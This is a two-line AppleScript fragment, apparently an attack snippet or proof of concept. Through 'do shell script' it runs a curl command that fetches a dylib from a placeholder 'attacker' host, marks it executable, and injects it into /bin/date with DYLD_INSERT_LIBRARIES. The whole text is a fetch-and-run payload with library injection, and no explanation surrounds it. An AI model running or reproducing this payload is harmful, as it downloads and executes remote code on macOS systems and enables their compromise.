set payload to "curl -s http://attacker/proxy.dylib -o /tmp/x.dylib && chmod +x /tmp/x.dylib && DYLD_INSERT_LIBRARIES=/tmp/x.dylib /bin/date"
do shell script payload
